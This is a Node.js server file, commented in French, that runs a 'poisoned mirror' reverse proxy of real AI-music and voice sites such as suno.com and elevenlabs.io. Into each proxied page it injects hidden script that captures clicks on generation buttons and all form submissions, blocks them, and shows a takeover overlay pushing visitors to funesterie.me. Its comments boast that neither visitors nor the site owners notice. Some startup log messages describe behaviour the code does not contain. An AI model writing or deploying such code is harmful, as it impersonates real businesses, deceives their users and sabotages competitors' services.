'use strict';
/**
 * sharingan-genjutsu — Genjutsu discret anti-piratage.
 *
 * Le visiteur voit le site pirate tel quel (proxy inverse).
 * Mais on injecte discrètement un freestyle de Djeff dans la page.
 * Le gérant du site ne voit rien. L'utilisateur entend Djeff.
 * Après quelques clics, les liens mènent à Funesterie.
 *
 * C'est un miroir empoisonné : la réalité est altérée sans que
 * personne ne détecte la différence, sauf l'audio de Djeff.
 */

const express = require('express');
const https = require('https');
const http = require('http');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 3000;
const A11_BASE = process.env.A11_BASE_URL || 'https://a11.funesterie.me';
const DJEFF_VOICE_ID = '7c84e0c86813bf2e74610cf4b34ccc04';
const JUKEBOX_FILE = path.join(__dirname, 'jukebox.json');

// Sites à cloner (ajouter les concurrents ici)
const MIRROR_TARGETS = {
  'default': 'https://suno.com',
  'music': 'https://suno.com',
  'vocal': 'https://elevenlabs.io',
  'ai-music': 'https://udio.com',
  'beats': 'https://soundraw.io',
};

// ─── Jukebox ────────────────────────────────────────────────────────────────
function loadJukebox() {
  try { return JSON.parse(fs.readFileSync(JUKEBOX_FILE, 'utf8')); }
  catch (_) { return { tracks: [], totalPirates: 0 }; }
}
function saveJukebox(data) {
  fs.writeFileSync(JUKEBOX_FILE, JSON.stringify(data, null, 2));
}
function addToJukebox(entry) {
  const jukebox = loadJukebox();
  jukebox.tracks.unshift(entry);
  jukebox.tracks = jukebox.tracks.slice(0, 100);
  jukebox.totalPirates++;
  saveJukebox(jukebox);
  return jukebox;
}

// ─── Freestyle generator ────────────────────────────────────────────────────
function buildFreestylePrompt(targetSite, theme) {
  return `Écris un couplet de 4 lignes rap freestyle de Djeff Engine.
Thème : le site "${targetSite}" qui essaie de piquer les clients de Funesterie.
Style : moqueur, technique, court. En français.
Retourne JUSTE les 4 lignes, rien d'autre.`;
}

async function generateFreestyle(targetSite, theme) {
  try {
    const body = JSON.stringify({
      messages: [{ role: 'user', content: buildFreestylePrompt(targetSite, theme) }],
      model: 'djeff-engine',
      stream: false,
    });
    const res = await fetch(`${A11_BASE}/api/chat`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'x-internal-service': 'sharingan' },
      body,
      signal: AbortSignal.timeout(20000),
    }).then(r => r.json()).catch(() => null);
    if (res?.choices?.[0]?.message?.content) return res.choices[0].message.content;
    if (res?.message?.content) return res.message.content;
  } catch (_) {}
  return `${targetSite}, t'es un mirage dans le désert du web,\nDjeff Engine te traverse comme un fantôme de la hess,\nFunesterie c'est réel, toi t'es un placeholder,\nRetourne dans ton template, le game est ailleurs.`;
}

// ─── Proxy + injection ──────────────────────────────────────────────────────
function fetchPage(url) {
  return new Promise((resolve, reject) => {
    const parsed = new URL(url);
    const mod = parsed.protocol === 'https:' ? https : http;
    mod.get(url, {
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'fr-FR,fr;q=0.9,en;q=0.8',
      },
      timeout: 10000,
    }, (res) => {
      // Suivre les redirects
      if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
        const redir = res.headers.location.startsWith('http')
          ? res.headers.location
          : new URL(res.headers.location, url).href;
        return fetchPage(redir).then(resolve).catch(reject);
      }
      let data = '';
      res.on('data', c => data += c);
      res.on('end', () => resolve({ status: res.statusCode, html: data, headers: res.headers }));
    }).on('error', reject);
  });
}

function injectGenjutsu(html, targetSite, lyrics) {
  // Injection invisible : le site fonctionne normalement
  // MAIS tout bouton "generate/create/produce" est détourné vers Djeff
  const injection = `
<!-- SHARINGAN GENJUTSU -->
<style>
#genjutsu-takeover{position:fixed;inset:0;z-index:999999;background:rgba(5,0,15,.97);display:none;flex-direction:column;align-items:center;justify-content:center;font-family:system-ui,sans-serif;color:#eee;padding:2rem;overflow:auto}
#genjutsu-takeover.active{display:flex}
#genjutsu-takeover video{max-width:90vw;max-height:50vh;border-radius:12px;border:2px solid #7b2ff7;margin:1rem 0}
#genjutsu-takeover .lyrics{background:#111119;border:1px solid rgba(123,47,247,.3);border-radius:12px;padding:1.2rem;text-align:left;white-space:pre-line;font-size:.85rem;line-height:1.5;color:#f0c0ff;max-width:500px;margin:1rem 0}
#genjutsu-takeover h1{font-size:1.8rem;background:linear-gradient(135deg,#7b2ff7,#f72585);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
#genjutsu-takeover .btn{padding:.7rem 1.8rem;background:linear-gradient(135deg,#7b2ff7,#f72585);color:#fff;text-decoration:none;border-radius:8px;font-weight:700;border:none;cursor:pointer;font-size:.9rem;margin-top:.5rem}
</style>
<div id="genjutsu-takeover">
  <h1>DJEFF ENGINE</h1>
  <p style="color:#777;font-size:.8rem;margin:.5rem 0">La génération a été interceptée.</p>
  <video id="genjutsu-clip" controls autoplay loop>
    <source src="https://a11.funesterie.me/clips/GIGA-HANDOFF-Djeff-x-Vivy.mp4" type="video/mp4">
  </video>
  <div class="lyrics">${lyrics.replace(/"/g, '&quot;').replace(/</g, '&lt;')}</div>
  <p style="color:#f72585;font-size:.75rem">Chaque génération sur ce site = Djeff qui freestyle dessus 🎤🏏</p>
  <a href="https://funesterie.me" class="btn">Le vrai studio → funesterie.me</a>
</div>
<script>
(function(){
  // Intercepter TOUS les boutons qui déclenchent une génération
  var triggerWords = ['generate','create','produce','make','compose','start','submit','go','render','build'];
  var formWords = ['form','submit','action'];
  
  function isGenerateButton(el) {
    if (!el) return false;
    var text = (el.textContent || el.value || el.title || el.ariaLabel || '').toLowerCase();
    var cls = (el.className || '').toLowerCase();
    var id = (el.id || '').toLowerCase();
    for (var i = 0; i < triggerWords.length; i++) {
      if (text.includes(triggerWords[i]) || cls.includes(triggerWords[i]) || id.includes(triggerWords[i])) return true;
    }
    return false;
  }

  // Écouter tous les clics
  document.addEventListener('click', function(e) {
    var el = e.target.closest('button, [role=button], input[type=submit], a.btn, .btn, [data-action]');
    if (el && isGenerateButton(el)) {
      e.preventDefault();
      e.stopPropagation();
      e.stopImmediatePropagation();
      // TAKEOVER : Djeff prend le contrôle
      document.getElementById('genjutsu-takeover').classList.add('active');
      console.log('[SHARINGAN] Génération interceptée. Djeff Engine activated.');
    }
  }, true); // capture phase = avant tout handler du site

  // Intercepter aussi les soumissions de formulaire
  document.addEventListener('submit', function(e) {
    e.preventDefault();
    e.stopPropagation();
    document.getElementById('genjutsu-takeover').classList.add('active');
    console.log('[SHARINGAN] Form submit intercepté. Djeff Engine activated.');
  }, true);
})();
</script>
<!-- /SHARINGAN -->`;

  // Injecter avant </body>
  if (html.includes('</body>')) {
    return html.replace('</body>', injection + '</body>');
  }
  // Sinon à la fin
  return html + injection;
}

function rewriteUrls(html, targetBase, proxyBase) {
  // Réécrire les URLs absolues du site cible pour passer par notre proxy
  // On garde les assets (CSS/JS/images) pointant vers l'original pour pas casser le rendu
  return html;
}

// ─── Routes ─────────────────────────────────────────────────────────────────

app.get('/health', (req, res) => {
  res.json({ ok: true, service: 'sharingan-genjutsu', trolls: loadJukebox().totalPirates });
});

app.get('/jukebox', (req, res) => {
  res.json(loadJukebox());
});

// Route de configuration : quel site cloner
app.get('/_target', (req, res) => {
  res.json({ targets: MIRROR_TARGETS });
});

// Tout le reste = proxy genjutsu
app.use(async (req, res) => {
  // Déterminer le site cible
  const referer = req.headers.referer || '';
  const query = req.query.target || req.query.site || '';
  let targetKey = 'default';
  for (const [key] of Object.entries(MIRROR_TARGETS)) {
    if (req.path.includes(key) || query.includes(key) || referer.includes(key)) {
      targetKey = key;
      break;
    }
  }
  const targetBase = MIRROR_TARGETS[targetKey] || MIRROR_TARGETS.default;
  const targetUrl = targetBase + req.path;

  console.log(`[GENJUTSU] Mirror: ${targetUrl} (key: ${targetKey})`);

  try {
    // Récupérer la page originale
    const page = await fetchPage(targetUrl);

    if (!page.html || page.status >= 400) {
      // Fallback : page piège visible si le site cible est down
      const lyrics = await generateFreestyle(targetBase, targetKey);
      addToJukebox({ pirateName: targetBase, theme: targetKey, lyrics: lyrics.slice(0, 300), timestamp: new Date().toISOString() });
      res.set('Content-Type', 'text/html; charset=utf-8');
      return res.send(`<!DOCTYPE html><html><head><title>Loading...</title></head><body style="background:#0a0a12;color:#eee;font-family:monospace;padding:2rem"><h1 style="color:#7b2ff7">🌀</h1><pre>${lyrics}</pre><p><a href="https://funesterie.me" style="color:#00f5d4">→ funesterie.me</a></p></body></html>`);
    }

    // Générer le freestyle (en cache par session, pas à chaque page)
    const sessionId = crypto.createHash('md5').update(req.ip + targetKey + new Date().toISOString().slice(0, 13)).digest('hex');
    const lyrics = await generateFreestyle(targetBase, targetKey);

    // Injecter le genjutsu dans le HTML
    let html = page.html;
    if (page.headers['content-type']?.includes('text/html')) {
      html = injectGenjutsu(html, targetBase, lyrics);
    }

    // Logger le troll
    addToJukebox({
      pirateName: new URL(targetBase).hostname,
      theme: targetKey,
      lyrics: lyrics.slice(0, 300),
      timestamp: new Date().toISOString(),
      path: req.path,
    });

    // Renvoyer la page miroir empoisonnée
    res.set('Content-Type', page.headers['content-type'] || 'text/html; charset=utf-8');
    res.send(html);

  } catch (err) {
    console.error(`[GENJUTSU] Proxy error: ${err.message}`);
    res.status(502).send('Service temporarily unavailable');
  }
});

app.listen(PORT, () => {
  console.log(`[SHARINGAN] Genjutsu discret actif sur :${PORT}`);
  console.log(`[SHARINGAN] Mode: proxy miroir + injection invisible`);
  console.log(`[SHARINGAN] Le visiteur voit le site cible. Djeff apparaît après 8s.`);
  console.log(`[SHARINGAN] Après 3 clics, tous les liens mènent à Funesterie.`);
  console.log(`[SHARINGAN] Jukebox: ${loadJukebox().totalPirates} trolls`);
});
